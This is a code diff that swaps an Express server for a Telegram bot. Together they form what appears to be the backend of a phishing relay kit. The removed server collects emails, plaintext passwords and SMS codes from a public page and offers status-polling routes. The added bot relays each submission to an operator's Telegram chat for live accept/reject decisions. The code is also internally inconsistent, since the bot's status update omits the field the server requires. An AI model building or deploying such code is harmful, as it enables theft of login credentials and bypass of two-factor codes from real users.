@@ -1,97 +1,95 @@
-const express = require("express");
-const bodyParser = require("body-parser");
-const cors = require("cors");
+const TelegramBot = require("node-telegram-bot-api");
 const fetch = require("node-fetch");
-const {
-    sendApprovalRequest,
-    sendApprovalRequestGeneric,
-    sendApprovalRequestSMS,
-} = require("./bot");
 
-const app = express();
-const PORT = process.env.PORT || 3000;
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+const APP_URL = process.env.APP_URL;
 
-// Pending items storage
-let pendingLogins = {}; // { email: { password, status } }
-let pendingGenerics = {}; // { identifier: status }
-let pendingSMS = {}; // { code: status }
+// Start bot in polling mode
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-app.use(cors());
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(bodyParser.json());
-app.use(express.static("public"));
-
-// Health check
-app.get("/", (req, res) => res.send("✅ Server is running."));
-
-// ----- LOGIN ROUTES -----
-app.post("/login", (req, res) => {
-    const email = req.body.email.trim().toLowerCase();
-    const password = req.body.password;
-    pendingLogins[email] = { password, status: "pending" };
-
-    sendApprovalRequest(email, password);
-    res.json({ success: true });
-});
-
-app.get("/check-login-status", (req, res) => {
-    const email = (req.query.email || "").trim().toLowerCase();
-    const status = pendingLogins[email] ? pendingLogins[email].status : "unknown";
-    res.json({ status });
-});
-
-// ----- GENERIC APPROVAL ROUTES -----
-app.post("/generic", (req, res) => {
-    const identifier = req.body.identifier.trim();
-    pendingGenerics[identifier] = "pending";
-
-    sendApprovalRequestGeneric(identifier);
-    res.json({ success: true });
-});
-
-app.get("/check-generic-status", (req, res) => {
-    const identifier = (req.query.identifier || "").trim();
-    const status = pendingGenerics[identifier] || "unknown";
-    res.json({ status });
-});
-
-// ----- SMS CODE ROUTES -----
-app.post("/sms-login", (req, res) => {
-    const code = (req.body.code || "").trim();
-    if (!code) return res.status(400).json({ success: false, message: "Code required" });
-
-    pendingSMS[code] = "pending";
-    sendApprovalRequestSMS(code);
-    res.json({ success: true });
-});
-
-app.get("/check-sms-status", (req, res) => {
-    const code = (req.query.code || "").trim();
-    const status = pendingSMS[code] || "unknown";
-    res.json({ status });
-});
-
-// Update approval status (called by bot)
-app.post("/update-status", (req, res) => {
-    const { type, value, status } = req.body;
-
-    if (!type || !value || !status)
-        return res.status(400).json({ error: "Missing data" });
-
-    if (type === "login" && pendingLogins[value]) pendingLogins[value].status = status;
-    else if (type === "sms" && pendingSMS[value]) pendingSMS[value] = status;
-    else if (type === "generic" && pendingGenerics[value]) pendingGenerics[value] = status;
-    else return res.status(404).json({ error: "Item not found" });
-
-    console.log(`✅ ${type} ${value} marked as ${status}`);
-    res.json({ success: true });
-});
-
-// Self-ping to stay awake
-setInterval(() => {
-    if (process.env.APP_URL) {
-        fetch(process.env.APP_URL).catch(err => console.error("⚠️ Ping failed:", err));
+// -----------------
+// Email/Password approval
+// -----------------
+function sendApprovalRequest(email, password) {
+  const options = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept|${email}` },
+          { text: "❌ Reject", callback_data: `reject|${email}` }
+        ]
+      ]
     }
-}, 30 * 1000);
+  };
+  bot.sendMessage(ADMIN_CHAT_ID, `*Login Approval Requested*\nEmail: ${email}`, { ...options, parse_mode: "Markdown" });
+}
 
-app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));
+// -----------------
+// Generic code approval
+// -----------------
+function sendApprovalRequestGeneric(identifier) {
+  const options = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept|${identifier}` },
+          { text: "❌ Reject", callback_data: `reject|${identifier}` }
+        ]
+      ]
+    }
+  };
+  bot.sendMessage(ADMIN_CHAT_ID, `*Approval Requested*\nIdentifier: ${identifier}`, { ...options, parse_mode: "Markdown" });
+}
+
+// -----------------
+// SMS code approval
+// -----------------
+function sendApprovalRequestSMS(code) {
+  const options = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept|${code}` },
+          { text: "❌ Reject", callback_data: `reject|${code}` }
+        ]
+      ]
+    }
+  };
+  bot.sendMessage(ADMIN_CHAT_ID, `*SMS Approval Requested*\nCode: ${code}`, { ...options, parse_mode: "Markdown" });
+}
+
+// -----------------
+// Handle button clicks
+// -----------------
+bot.on("callback_query", async (query) => {
+  try {
+    const [action, identifier] = query.data.split("|");
+    const status = action === "accept" ? "accepted" : "rejected";
+
+    // Notify backend
+    await fetch(`${APP_URL}/update-status`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ identifier, status })
+    });
+
+    await bot.answerCallbackQuery(query.id, { text: `✅ ${status}` });
+    await bot.editMessageText(`🔐 ${identifier} has been *${status.toUpperCase()}*`, {
+      chat_id: query.message.chat.id,
+      message_id: query.message.message_id,
+      parse_mode: "Markdown"
+    });
+
+  } catch (err) {
+    console.error("❌ Failed to handle callback:", err);
+    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
+  }
+});
+
+// /start command
+bot.onText(/\/start/, (msg) => {
+  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for approvals.");
+});
+
+module.exports = { sendApprovalRequest, sendApprovalRequestGeneric, sendApprovalRequestSMS };
